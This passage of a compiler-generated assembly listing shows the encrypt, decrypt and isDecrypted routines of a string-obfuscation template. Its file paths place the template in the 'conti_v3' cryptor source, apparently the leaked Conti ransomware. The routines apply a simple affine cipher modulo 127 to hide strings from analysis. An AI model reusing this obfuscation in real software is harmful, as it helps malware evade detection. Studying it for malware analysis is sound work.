  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DF@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0DF@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0DF@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 35	 imul	 r8d, eax, 53		; 00000035H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 30	 add	 r8d, 48			; 00000030H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DF@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DF@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0DF@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ PROC ; MetaBuffer<53,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DF@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<53,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0GN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BB@$0GN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,109,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 6d	 sub	 eax, 109		; 0000006dH
  00006	44 6b c0 0f	 imul	 r8d, eax, 15

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0GN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,109,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BB@$0GN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BB@$0GN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,109,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 11	 imul	 r8d, eax, 17
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 6d	 add	 r8d, 109		; 0000006dH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BB@$0GN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,109,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BB@$0GN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BB@$0GN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ PROC ; MetaBuffer<17,109,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BB@$0GN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<17,109,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EH@$0HC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0EH@$0HC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z PROC ; MetaBuffer<71,114,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 72	 sub	 eax, 114		; 00000072H
  00006	44 6b c0 22	 imul	 r8d, eax, 34		; 00000022H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EH@$0HC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<71,114,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0EH@$0HC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0EH@$0HC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z PROC ; MetaBuffer<71,114,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 47	 imul	 r8d, eax, 71		; 00000047H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 72	 add	 r8d, 114		; 00000072H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EH@$0HC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<71,114,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EH@$0HC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0EH@$0HC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ PROC ; MetaBuffer<71,114,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EH@$0HC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<71,114,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$01$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 15 00 00 00	 mov	 ecx, 21
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 3f	 imul	 r8d, ecx, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$01$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$01$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 8d 04 45 15
	00 00 00	 lea	 r8d, DWORD PTR [rax*2+21]
  0000b	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$01$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$01$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$01$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ PROC ; MetaBuffer<2,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$01$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<2,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$06$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 28 00 00 00	 mov	 ecx, 40			; 00000028H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]
  00013	45 03 c0	 add	 r8d, r8d

; 40   :     return (a % n + n) % n;

  00016	41 f7 e8	 imul	 r8d
  00019	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001e	41 03 d0	 add	 edx, r8d
  00021	c1 fa 06	 sar	 edx, 6
  00024	8b ca		 mov	 ecx, edx
  00026	c1 e9 1f	 shr	 ecx, 31
  00029	03 d1		 add	 edx, ecx
  0002b	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002e	44 2b c1	 sub	 r8d, ecx
  00031	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00035	41 f7 e8	 imul	 r8d
  00038	41 03 d0	 add	 edx, r8d
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b ca		 mov	 ecx, edx
  00040	c1 e9 1f	 shr	 ecx, 31
  00043	03 d1		 add	 edx, ecx
  00045	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00048	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004b	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004f	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$06$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$06$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 07	 imul	 r8d, eax, 7
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 28	 add	 r8d, 40			; 00000028H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$06$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$06$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$06$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ PROC ; MetaBuffer<7,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$06$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<7,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0L@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0L@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z PROC ; MetaBuffer<11,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 03 00 00 00	 mov	 ecx, 3
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 17	 imul	 r8d, ecx, 23

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0L@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<11,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0L@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0L@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z PROC ; MetaBuffer<11,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 0b	 imul	 r8d, eax, 11
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
